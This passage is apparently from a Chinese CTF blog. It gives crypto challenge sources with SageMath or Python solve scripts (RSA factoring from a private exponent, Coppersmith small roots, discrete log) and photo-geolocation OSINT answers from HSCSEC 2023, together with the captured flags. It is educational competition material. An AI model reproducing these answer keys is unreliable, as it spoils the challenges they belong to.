class="number">1862</span>, <span class="number">1516</span>, <span class="number">693</span>, <span class="number">1819</span>, <span class="number">1583</span>, <span class="number">1472</span>, <span class="number">671</span>, <span class="number">1295</span>, <span class="number">1526</span>, <span class="number">1094</span>, <span class="number">518</span>, <span class="number">1189</span>, <span class="number">1583</span>, <span class="number">1345</span>, <span class="number">1054</span>, <span class="number">1788</span>, <span class="number">661</span>, <span class="number">960</span>, <span class="number">975</span>, <span class="number">927</span>, <span class="number">423</span>, <span class="number">380</span>, <span class="number">791</span>, <span class="number">1282</span>, <span class="number">1239</span>, <span class="number">756</span>, <span class="number">199</span>, <span class="number">1686</span>, <span class="number">745</span>, <span class="number">754</span>, <span class="number">1417</span>, <span class="number">1347</span>, <span class="number">1581</span>, <span class="number">626</span>, <span class="number">1772</span>, <span class="number">1465</span>, <span class="number">1985</span>, <span class="number">968</span>, <span class="number">1728</span>, <span class="number">1641</span>], [<span class="number">1280</span>, <span class="number">392</span>, <span class="number">1695</span>, <span class="number">882</span>, <span class="number">1225</span>, <span class="number">1766</span>, <span class="number">683</span>, <span class="number">633</span>, <span class="number">1065</span>, <span class="number">1605</span>, <span class="number">1086</span>, <span class="number">500</span>, <span class="number">23</span>, <span class="number">1836</span>, <span class="number">583</span>, <span class="number">589</span>, <span class="number">1075</span>, <span class="number">810</span>, <span class="number">652</span>, <span class="number">1105</span>, <span class="number">511</span>, <span class="number">1756</span>, <span class="number">20</span>, <span class="number">756</span>, <span class="number">988</span>, <span class="number">1175</span>, <span class="number">134</span>, <span class="number">630</span>, <span class="number">320</span>, <span class="number">343</span>, <span class="number">213</span>, <span class="number">1885</span>, <span class="number">550</span>, <span class="number">146</span>, <span class="number">1121</span>, <span class="number">1650</span>, <span class="number">1101</span>, <span class="number">895</span>, <span class="number">294</span>, <span class="number">1710</span>, <span class="number">1995</span>, <span class="number">1022</span>], [<span class="number">340</span>, <span class="number">1498</span>, <span class="number">491</span>, <span class="number">1964</span>, <span class="number">993</span>, <span class="number">1479</span>, <span class="number">1752</span>, <span class="number">263</span>, <span class="number">1156</span>, <span class="number">493</span>, <span class="number">1812</span>, <span class="number">1892</span>, <span class="number">595</span>, <span class="number">1919</span>, <span class="number">897</span>, <span class="number">1520</span>, <span class="number">1503</span>, <span class="number">1102</span>, <span class="number">809</span>, <span class="number">1374</span>, <span class="number">1693</span>, <span class="number">538</span>, <span class="number">1310</span>, <span class="number">372</span>, <span class="number">543</span>, <span class="number">245</span>, <span class="number">1912</span>, <span class="number">1193</span>, <span class="number">356</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">1336</span>, <span class="number">821</span>, <span class="number">1111</span>, <span class="number">1678</span>, <span class="number">163</span>, <span class="number">298</span>, <span class="number">410</span>, <span class="number">740</span>, <span class="number">1039</span>, <span class="number">258</span>, <span class="number">1256</span>], [<span class="number">542</span>, <span class="number">1181</span>, <span class="number">1683</span>, <span class="number">1782</span>, <span class="number">1355</span>, <span class="number">1598</span>, <span class="number">853</span>, <span class="number">1372</span>, <span class="number">1016</span>, <span class="number">1416</span>, <span class="number">466</span>, <span class="number">502</span>, <span class="number">528</span>, <span class="number">1428</span>, <span class="number">1742</span>, <span class="number">1748</span>, <span class="number">963</span>, <span class="number">1967</span>, <span class="number">844</span>, <span class="number">596</span>, <span class="number">996</span>, <span class="number">37</span>, <span class="number">201</span>, <span class="number">525</span>, <span class="number">147</span>, <span class="number">1576</span>, <span class="number">741</span>, <span class="number">532</span>, <span class="number">583</span>, <span class="number">192</span>, <span class="number">535</span>, <span class="number">762</span>, <span class="number">521</span>, <span class="number">198</span>, <span class="number">1204</span>, <span class="number">1460</span>, <span class="number">1848</span>, <span class="number">494</span>, <span class="number">1704</span>, <span class="number">43</span>, <span class="number">1437</span>, <span class="number">1946</span>], [<span class="number">1308</span>, <span class="number">47</span>, <span class="number">975</span>, <span class="number">1577</span>, <span class="number">762</span>, <span class="number">1978</span>, <span class="number">0</span>, <span class="number">562</span>, <span class="number">1373</span>, <span class="number">1</span>, <span class="number">1046</span>, <span class="number">229</span>, <span class="number">542</span>, <span class="number">695</span>, <span class="number">582</span>, <span class="number">1455</span>, <span class="number">360</span>, <span class="number">245</span>, <span class="number">1343</span>, <span class="number">458</span>, <span class="number">1365</span>, <span class="number">1859</span>, <span class="number">1722</span>, <span class="number">1967</span>, <span class="number">19</span>, <span class="number">447</span>, <span class="number">1545</span>, <span class="number">1190</span>, <span class="number">1278</span>, <span class="number">675</span>, <span class="number">1992</span>, <span class="number">1769</span>, <span class="number">1435</span>, <span class="number">358</span>, <span class="number">10</span>, <span class="number">796</span>, <span class="number">155</span>, <span class="number">1000</span>, <span class="number">1615</span>, <span class="number">927</span>, <span class="number">1789</span>, <span class="number">823</span>]]</span><br><span class="line">c = [<span class="number">644</span>, <span class="number">915</span>, <span class="number">892</span>, <span class="number">1015</span>, <span class="number">1876</span>, <span class="number">1611</span>, <span class="number">925</span>, <span class="number">334</span>, <span class="number">36</span>, <span class="number">41</span>, <span class="number">629</span>, <span class="number">1829</span>, <span class="number">1939</span>, <span class="number">1681</span>, <span class="number">224</span>, <span class="number">646</span>, <span class="number">502</span>, <span class="number">1284</span>, <span class="number">663</span>, <span class="number">1592</span>, <span class="number">1890</span>, <span class="number">1097</span>, <span class="number">1499</span>, <span class="number">1927</span>, <span class="number">30</span>, <span class="number">1202</span>, <span class="number">2012</span>, <span class="number">985</span>, <span class="number">1393</span>, <span class="number">106</span>, <span class="number">1220</span>, <span class="number">1687</span>, <span class="number">1712</span>, <span class="number">1077</span>, <span class="number">1957</span>, <span class="number">1418</span>, <span class="number">555</span>, <span class="number">514</span>, <span class="number">1552</span>, <span class="number">968</span>, <span class="number">1645</span>, <span class="number">1850</span>, <span class="number">919</span>, <span class="number">587</span>, <span class="number">463</span>, <span class="number">963</span>, <span class="number">1503</span>, <span class="number">1251</span>, <span class="number">3</span>, <span class="number">1251</span>, <span class="number">1711</span>, <span class="number">114</span>, <span class="number">190</span>, <span class="number">1891</span>, <span class="number">740</span>, <span class="number">1358</span>, <span class="number">1698</span>, <span class="number">295</span>, <span class="number">1313</span>, <span class="number">1812</span>, <span class="number">1067</span>, <span class="number">455</span>, <span class="number">1622</span>, <span class="number">541</span>, <span class="number">155</span>, <span class="number">1083</span>]</span><br><span class="line"></span><br><span class="line">key = matrix(Zmod(P), key)</span><br><span class="line">c = vector(Zmod(P), c)</span><br><span class="line">m = key \ c</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m.<span class="built_in">list</span>()))</span><br><span class="line"><span class="comment">#flag&#123;0e3ceb92-ef28-48ff-8a1f-556ea8e96263&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="Euler"><a href="#Euler" class="headerlink" title="Euler"></a>Euler</h1><h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">n1 = p*q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;d =&#x27;</span>, d)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n1 =&#x27;</span>, n1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    tmp = getPrime(<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(random.randint(<span class="number">1</span>, <span class="number">10</span>)):</span><br><span class="line">        n2 *= tmp</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(n2).bit_length() &gt; <span class="number">4096</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = p</span><br><span class="line">c = <span class="built_in">pow</span>(m,p,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n2 = <span class="subst">&#123;n2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">d = 1191103734504058491421349604548564929848616842152689496895544381837156883533438743584190765148552934760581271144506002162145850044043706855922892271482076871873995241085136144968243140990856473896170280564822732549232192446031619309897442553542363254504471740017966570662964696395047018142115398837264339359703632345253800336497946214283448557066829445107164480953216959246058743836325220516737638124436265379246043689904351250933647836622874758885644860021461954464385862680106712884194095768373281466098064819110033091294767089010003022970009602841916377292236136049332199074587736162893766795170383769105855396481</span></span><br><span class="line"><span class="string">n1 = 13580613334758608446812976519363134969987613428002924766535019511562587104406919787452524386837284913953412450765046949147625708826808005604839699164252065405707381022094044455947068672776228380259796742758661695038105462132145830673755861626914728707456430832560451486001864528121467715375751025330165798298234749333641286199156268444951660172758198564829589895780644285230824166251980165312273600373379395893191960302458674257328572576250700441136204817923980559222287090491322038600230306017349810608247758292597409739448697047571469597942133677889648017239246044193456551115423543297398389835141582226233401091651</span></span><br><span class="line"><span class="string">n2 = 1214806402018035399640161601350276689119300500885922730338627878893519991129980125476434307328318616551645952775278810103829168554249376991124646974529506458637833256309925386195767085673143119319959502919427611337245914269082657148902705137556296048781578971739222821624583120801659535369927877985173236243714461317935517361255270715241189816284530991305321818355420570545833978683123138276923580243415962479127687019106264574314649544746346086459905012212977958967691480715239783822121874583716717022133331534258680100103894980839994381411182849477289831563331555051111524494710894174250831042393260657010039224282544484051247017811298503920278914985702602401902771910416165113998593372720867385848641975504106450347785422029536444684536992419844582901814455572310411304170053743720539065216022165732393062765647406642461667856590659949987014165020908912248704605394194332522772838334355686250772722614893659631917281850223784937395431499960460631775969046704990152101465734651932493302101064276553602695086721483441047849063689763309160624353722539937307711289340553305706186969043326282042780389837191270199164643251358171042535614702470861637110776902483824241373428279843481575953477705679020507998934443944753893015492521729164439</span></span><br><span class="line"><span class="string">c = 829714996515560908603942343505920996556339059436557287421074174277687809974667533248085244071086827486112801279665776466949992570288124598686592774771062800764512333540404127622921352174419248968970404794754685847236748961563984628001223295272803310968932487079932521884266677193760840062257399310444131681778575116034804962240312440452076927109544707668525304555494031530153484385014733733295665648179563341929829366393842180933029552234342383165468329118358481709562138556464490952636983157762226775051069620144327191146321078089031134997806488306619954921967209307290224398561337468466377749200533482249418692505335754212596152956893594720809675348504752525191974229476876972508737538861376367290460994163758533707257433535992369795872961693633915923559165304176024241693969803856234404053572424185908635089962296448104233424369921110004610276316317120909034370571217382030431552784144041430129071509829206755292634358474170376986660230213480604735611696589811824530116203051420922042313844629631979060959674508082246111229472102010511440894011705450255517464228219748967389876595425302704439665665510611452129328353818804395006155136491014104673084625985358676817967767734690717397046423097222254342558118886724303282396865112622135</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">e = </span><br><span class="line">d = </span><br><span class="line">n1 = </span><br><span class="line">n2 = </span><br><span class="line">c = </span><br><span class="line">import random</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">def getpq(n,e,d):</span><br><span class="line">    while True:</span><br><span class="line">        k = e * d - 1</span><br><span class="line">        g = random.randint(0, n)</span><br><span class="line">        while k%2 == 0:</span><br><span class="line">            k = k // 2</span><br><span class="line">            temp = pow(g,k,n)-1</span><br><span class="line">            if GCD(temp,n)&gt;1 and temp!=0:</span><br><span class="line">                return GCD(temp,n)</span><br><span class="line">p = getpq(n1, e, d)</span><br><span class="line">q = n1 // p</span><br><span class="line">phi = euler_phi(n2)</span><br><span class="line">print(long_to_bytes(pow(c, inverse_mod(p, phi), n2)))</span><br><span class="line">print(long_to_bytes(pow(c, inverse_mod(q, phi), n2)))</span><br></pre></td></tr></table></figure>







<h1 id="EZnumber"><a href="#EZnumber" class="headerlink" title="EZnumber"></a>EZnumber</h1><p>题目</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">200</span></span><br><span class="line">B = getPrime(<span class="number">1024</span>)</span><br><span class="line">A = (<span class="number">2022</span>-<span class="number">2023</span>*m) % B</span><br><span class="line">leak = <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">2023</span>, B)</span><br><span class="line"><span class="built_in">print</span>(A)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"><span class="comment"># 170552035590584371794277768762390230763544207477112166060533204313753004629936685595405184205281232276007015670211368033442806936779308867580378436822021847321737051586882192693878924902157737728943995367527577690099125847661701232120507334675776645787433344767625337798357285176902699598449086385213291366162</span></span><br><span class="line"><span class="comment"># 66573767005779268080495621179078972426265588843146030764009851250207246081886465887129685885427908408673076322868864723505267053962926489662364269721110570269848306490343161117767892544708463436083630857549295570803296389232068947551581525974801496469745646172924950992026908012083467414933570463776905332979</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">A = <span class="number">170552035590584371794277768762390230763544207477112166060533204313753004629936685595405184205281232276007015670211368033442806936779308867580378436822021847321737051586882192693878924902157737728943995367527577690099125847661701232120507334675776645787433344767625337798357285176902699598449086385213291366162</span></span><br><span class="line">leak = <span class="number">66573767005779268080495621179078972426265588843146030764009851250207246081886465887129685885427908408673076322868864723505267053962926489662364269721110570269848306490343161117767892544708463436083630857549295570803296389232068947551581525974801496469745646172924950992026908012083467414933570463776905332979</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A+2023*m-2022 = 0 % B</span></span><br><span class="line">KB = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">2023</span>)-leak</span><br><span class="line">PR.&lt;m&gt; = PolynomialRing(Zmod(KB))</span><br><span class="line">f = A+<span class="number">2023</span>*m-<span class="number">2022</span></span><br><span class="line">f = f.monic()</span><br><span class="line">x = f.small_roots(X=<span class="number">2</span>^<span class="number">200</span>, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(x[<span class="number">0</span>])))</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="EzLock"><a href="#EzLock" class="headerlink" title="EzLock"></a>EzLock</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() == <span class="number">47</span></span><br><span class="line">data = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">cs = []</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    cs.append(<span class="built_in">pow</span>(i, m, n))</span><br><span class="line"><span class="built_in">print</span>(cs)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[183098212086317720236828757315510192339273033804875740822801041376722387458993552796227899411901966324318366514880536763913315608412750265815750386810801443666072579873995967676472994916617708760086271155827496223499121301339946900578686321571238854410077055150282805741312173826325669295346629270100887114, 57033027040944100515577298747833062983449034346155581535109171399667991971614122726451624246276583123688811765412755210627513537740891720491136798691017567675611749056264437247135506921747135448387155606513983563110678466501221603978172670533058510913876368172674768929417846635764813733749021238273031358064, 44177513422937659688192503808032734159830361147993789424022745838993946766432456884886189398779755202878679629523667923807343226973440318127947558457476925179848208108399587026072741947465486816791306581859876197942191253278120326733144030253277598039138046967591357892542649422324554104602547660747339872074, 12631302718057472129138289484187738038805661685759196779990368768599115569927115234126312113575785471158626604808250556471019475882601443785660157133230999298014824293609691681149195181799904358979944719852988436666306120350671288382565369084160416022015445829639878167524217607450918100132212115997395372780, 42899381454706854217031716361682990989382003331688973566655317536112884234898037025883907894505663567670829738793956574655657437562098921910867502135260835097785409348930680677890714703165271668372795217905436049326872168290466249129739381681341323649536725632009485619857375114283009023943744880775769510652]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c2,c3,c4,c5,c6 = [<span class="number">183098212086317720236828757315510192339273033804875740822801041376722387458993552796227899411901966324318366514880536763913315608412750265815750386810801443666072579873995967676472994916617708760086271155827496223499121301339946900578686321571238854410077055150282805741312173826325669295346629270100887114</span>, <span class="number">57033027040944100515577298747833062983449034346155581535109171399667991971614122726451624246276583123688811765412755210627513537740891720491136798691017567675611749056264437247135506921747135448387155606513983563110678466501221603978172670533058510913876368172674768929417846635764813733749021238273031358064</span>, <span class="number">44177513422937659688192503808032734159830361147993789424022745838993946766432456884886189398779755202878679629523667923807343226973440318127947558457476925179848208108399587026072741947465486816791306581859876197942191253278120326733144030253277598039138046967591357892542649422324554104602547660747339872074</span>, <span class="number">12631302718057472129138289484187738038805661685759196779990368768599115569927115234126312113575785471158626604808250556471019475882601443785660157133230999298014824293609691681149195181799904358979944719852988436666306120350671288382565369084160416022015445829639878167524217607450918100132212115997395372780</span>, <span class="number">42899381454706854217031716361682990989382003331688973566655317536112884234898037025883907894505663567670829738793956574655657437562098921910867502135260835097785409348930680677890714703165271668372795217905436049326872168290466249129739381681341323649536725632009485619857375114283009023943744880775769510652</span>]</span><br><span class="line">data = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">n = gcd([c2**<span class="number">2</span>-c4, c2*c3-c6, c2*c6-c3*c4])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> n%i==<span class="number">0</span>:</span><br><span class="line">        n //= i</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># assert m.bit_length() == 47</span></span><br><span class="line">m = discrete_log_lambda(Mod(c2,n), Mod(<span class="number">2</span>, n), bounds=(<span class="number">2</span>^<span class="number">46</span>, <span class="number">2</span>^<span class="number">47</span>))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;flag&#123;&#x27;</span> + long_to_bytes(<span class="built_in">int</span>(m)) + <span class="string">b&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F/" rel="tag">黄河流域</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-HSCSEC-红客突击队-2023"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/"
    >HSCSEC-红客突击队-2023</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/" class="article-date">
  <time datetime="2023-02-13T06:32:52.000Z" itemprop="datePublished">2023-02-13</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2023/02/11 00:00 UTC+8 - 2023/02/12 23:59 UTC+8</span><br><span class="line"></span><br><span class="line">本届HSC-2th 2023是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web,crypto,misc,reverse,pwn等主流方向，并面向全球开放。</span><br><span class="line"></span><br><span class="line">Rank: 31</span><br></pre></td></tr></table></figure>



<h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h2 id="Happy-Lantern-Festival"><a href="#Happy-Lantern-Festival" class="headerlink" title="Happy Lantern Festival"></a>Happy Lantern Festival</h2><p>百度搜索阿勒泰市第十三届元宵灯会</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211112151940.png" alt="image-20230211112151940"></p>
<p>在阿勒泰市五百里风情街举办</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211112308268.png" alt="image-20230211112308268"></p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211113109127.png" alt="image-20230211113109127"></p>
<p>所以HSCSEC{新疆维吾尔自治区阿勒泰地区阿勒泰市五百里风情街}</p>
<h2 id="Boat"><a href="#Boat" class="headerlink" title="Boat"></a>Boat</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/boat.png" alt="boat"></p>
<p>通过百度搜索得到这是在西湖拍的照片</p>
<p>然后搜索西湖的具体位置</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211114001758.png" alt="image-20230211204617988"></p>
<p>HSCSEC{浙江省杭州市西湖区龙井路1号}</p>
<h2 id="Apple-Store"><a href="#Apple-Store" class="headerlink" title="Apple Store"></a>Apple Store</h2><p>通过百度识图得</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212112221530.png" alt="image-20230212112221530"></p>
<p>然后搜索西单大悦城</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212112321745.png" alt="image-20230212112321745"></p>
<p>HSCSEC{北京市西城区西单北大街131号}</p>
<h2 id="Airplane"><a href="#Airplane" class="headerlink" title="Airplane"></a>Airplane</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212112540058.png" alt="image-20230212112540058"></p>
<p>可以隐约看到风机型号应该是B-30EL百度</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212113106096.png" alt="image-20230212113106096"></p>
<p>发现是渝兴线上的   重庆到北京大兴机场的</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212113226575.png" alt="image-20230212113226575"></p>
<p>与飞机的俯瞰图有相同的地方</p>
<p>HSCSEC{北京市大兴区大兴国际机场}</p>
<h2 id="Beautiful-Park"><a href="#Beautiful-Park" class="headerlink" title="Beautiful Park"></a>Beautiful Park</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212113717456.png" alt="image-20230212113717456"></p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212113801024.png" alt="image-20230212113801024"></p>
<p>河北省张家口市怀来县的官厅水库国家湿地公园</p>
<p>HSCSEC{河北省张家口市怀来县官厅水库国家湿地公园}</p>
<h2 id="Tower"><a href="#Tower" class="headerlink" title="Tower"></a>Tower</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/Tower.jpg" alt="Tower"></p>
<p>通过百度识图得这是澳门巴黎塔</p>
<p>然后高德搜索具体位置</p>
<p>HSCSEC{澳门特别行政区路氹填海区澳门路氹金光大道连贯公路澳门巴黎人}</p>
<h2 id="Beautiful-Lake"><a href="#Beautiful-Lake" class="headerlink" title="Beautiful Lake"></a>Beautiful Lake</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230213142744556.png" alt="image-20230213142744556"></p>
<p>可以看到宁夏理工学院百度搜宁夏理工学院的湖的具体位置</p>
<p>HSCSEC{宁夏回族自治区石嘴山市大武口区星海湖}</p>
